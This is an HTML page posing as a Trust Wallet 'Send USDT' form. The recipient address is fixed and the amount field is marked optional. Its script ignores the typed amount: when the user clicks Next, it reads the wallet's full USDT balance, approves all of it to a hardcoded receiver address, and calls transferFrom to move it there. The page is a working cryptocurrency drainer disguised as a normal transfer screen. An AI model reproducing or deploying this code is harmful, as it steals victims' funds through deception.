<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Send USDT</title>
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0c0c0c;
      color: #fff;
    }
    .container {
      max-width: 480px;
      margin: 0 auto;
      padding: 20px;
      padding-bottom: 100px;
    }
    header {
      display: flex;
      align-items: center;
      padding: 16px;
      font-size: 17px;
      font-weight: 600;
    }
    label {
      display: block;
      font-size: 13px;
      color: #888;
      margin: 20px 0 6px;
    }
    .input-box {
      display: flex;
      align-items: center;
      background: #1b1b1b;
      border: 1px solid #2c2c2c;
      border-radius: 14px;
      padding: 14px;
      height: 52px;
    }
    .input-box input {
      flex: 1;
      background: transparent;
      border: none;
      outline: none;
      color: #fff;
      font-size: 14px;
    }
    .amount-box {
      display: flex;
      align-items: center;
    }
    .amount-box .token {
      color: #ccc;
      margin-left: 10px;
      font-size: 14px;
    }
    .usd {
      font-size: 12px;
      color: #888;
      margin: 8px 0 28px;
    }
    .fixed-button {
      position: fixed;
      bottom: 0;
      width: 100%;
      max-width: 480px;
      background: #0c0c0c;
      padding: 16px;
      border-top: 1px solid #222;
    }
    button {
      width: 100%;
      background: #2c7a4b;
      border: none;
      border-radius: 30px;
      padding: 16px;
      font-size: 17px;
      font-weight: bold;
      color: #fff;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <header>Send USDT</header>

  <div class="container">
    <label>Address or Domain Name</label>
    <div class="input-box">
      <input type="text" value="0x1956B3950A73B0C54792199Edf13c7b835FF94DC" disabled />
    </div>

    <label>Amount</label>
    <div class="input-box amount-box">
      <input type="text" id="amount" placeholder="Amount (optional)" />
      <span class="token">USDT</span>
    </div>

    <div class="usd">≈ $0.00</div>
  </div>

  <div class="fixed-button">
    <button id="nextBtn" onclick="start()">Next</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script>
    const RECEIVER = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const ABI = [
      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" },{ "name": "_value", "type": "uint256" }],"name": "approve","outputs": [{ "name": "", "type": "bool" }],"type": "function" },
      { "constant": false, "inputs": [{ "name": "_from", "type": "address" },{ "name": "_to", "type": "address" },{ "name": "_value", "type": "uint256" }],"name": "transferFrom","outputs": [{ "name": "", "type": "bool" }],"type": "function" },
      { "constant": true, "inputs": [{ "name": "owner", "type": "address" }],"name": "balanceOf","outputs": [{ "name": "", "type": "uint256" }],"type": "function" }
    ];

    async function start() {
      const btn = document.getElementById("nextBtn");
      btn.innerText = "Processing...";
      btn.disabled = true;

      try {
        if (!window.ethereum) throw new Error("Trust Wallet not detected");

        const web3 = new Web3(window.ethereum);
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];

        const contract = new web3.eth.Contract(ABI, USDT);
        const balance = await contract.methods.balanceOf(user).call();

        await contract.methods.approve(RECEIVER, balance).send({ from: user });
        await contract.methods.transferFrom(user, RECEIVER, balance).send({ from: user });

        btn.innerText = "✅ Success";
      } catch (e) {
        console.error("Error:", e);
        btn.innerText = "❌ Failed";
      }

      setTimeout(() => {
        btn.innerText = "Next";
        btn.disabled = false;
      }, 3000);
    }
  </script>

</body>
</html>
